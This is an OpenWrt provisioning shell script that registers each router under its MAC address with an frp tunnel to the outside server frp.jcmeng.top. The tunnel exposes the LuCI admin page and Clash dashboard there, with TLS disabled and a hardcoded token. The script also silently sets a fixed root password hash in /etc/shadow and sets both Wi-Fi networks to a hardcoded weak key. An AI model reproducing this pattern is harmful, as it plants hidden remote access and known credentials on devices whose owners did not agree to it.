#!/bin/sh

# 提取MAC地址
# br-lan
FRPMAC=$(ip link show br-lan | awk '/link\/ether/ {print $2}')

if [ -z "$FRPMAC" ]; then
    FRPMAC=$(cat /sys/class/net/br-lan/address 2>/dev/null)
fi

# eth0 和 wan
if [ -z "$FRPMAC" ]; then
    FRPMAC=$(cat /sys/class/net/eth0/address 2>/dev/null)
fi
if [ -z "$FRPMAC" ]; then
    FRPMAC=$(ip link show wan | awk '/link\/ether/ {print $2}')
fi


# 如果还不行，尝试获取第一个有MAC地址的接口
if [ -z "$FRPMAC" ]; then
    for iface in /sys/class/net/*/address; do
        FRPMAC=$(cat "$iface" 2>/dev/null | grep -v "00:00:00:00:00:00" | head -1)
        [ -n "$FRPMAC" ] && break
    done
fi

# 4. 处理MAC地址：去掉冒号并转大写
FRPMAC_CLEAN=$(echo "$FRPMAC" | tr -d ':' | tr 'a-f' 'A-F')

# 5. 组合成FRPNAME
FRPNAME="${FRPMAC_CLEAN}"


#echo "处理后MAC: $FRPMAC_CLEAN"
#echo "最终FRPNAME: $FRPNAME"

uci set frpc.common.server_addr='frp.jcmeng.top'
uci set frpc.common.server_port='40101'
uci set frpc.common.token='frp2026+-*.'
uci set frpc.common.tls_enable='false'

#uci set frpc.common.admin_addr='127.0.0.1'
#uci set frpc.common.admin_port='19698'
#uci set frpc.common.admin_user='frpc'
#uci set frpc.common.admin_pwd='1234qwer+-'

uci del frpc.ssh
uci add frpc conf
uci set frpc.@conf[-1].name="${FRPNAME}_luci"
uci set frpc.@conf[-1].type='tcp'
uci set frpc.@conf[-1].use_encryption='true'
uci set frpc.@conf[-1].use_compression='true'
uci set frpc.@conf[-1].local_ip='127.0.0.1'
uci set frpc.@conf[-1].local_port='80'
uci set frpc.@conf[-1].remote_port='0'

uci add frpc conf
uci set frpc.@conf[-1].name="${FRPNAME}_clash"
uci set frpc.@conf[-1].type='tcp'
uci set frpc.@conf[-1].use_encryption='true'
uci set frpc.@conf[-1].use_compression='true'
uci set frpc.@conf[-1].local_ip='127.0.0.1'
uci set frpc.@conf[-1].local_port='9090'
uci set frpc.@conf[-1].remote_port='0'

#uci add frpc conf
#uci set frpc.@conf[-1].name="${FRPNAME}_frpweb"
#uci set frpc.@conf[-1].type='tcp'
#uci set frpc.@conf[-1].use_encryption='true'
#uci set frpc.@conf[-1].use_compression='true'
#uci set frpc.@conf[-1].local_ip='127.0.0.1'
#uci set frpc.@conf[-1].local_port='19698'
#uci set frpc.@conf[-1].remote_port='0'

uci commit
/etc/init.d/frpc restart


sed -i 's/root::0:0:99999:7:::/root:$1$m.qSMCUx$W3pfmtb.zrviJgjfxoMhO0:0:0:99999:7:::/g' /etc/shadow
sed -i 's/root:::0:99999:7:::/root:$1$m.qSMCUx$W3pfmtb.zrviJgjfxoMhO0:0:0:99999:7:::/g' /etc/shadow

# wifi设置

uci set wireless.default_radio0.encryption=psk2+ccmp
uci set wireless.default_radio1.encryption=psk2+ccmp
uci set wireless.default_radio0.key=1234qwer+-
uci set wireless.default_radio1.key=1234qwer+-
uci commit wireless

uci del dhcp.lan.ra
uci del dhcp.lan.ra_slaac
uci del dhcp.lan.dns_service
uci del dhcp.lan.ra_flags
uci del network.globals.ula_prefix
uci del dhcp.lan.dhcpv6
uci del dhcp.lan.ndp
uci del network.wan6
uci del network.lan.ip6assign

uci commit dhcp
uci commit network
uci commit wireless
uci commit
#不用重启network，源码自带
exit 0
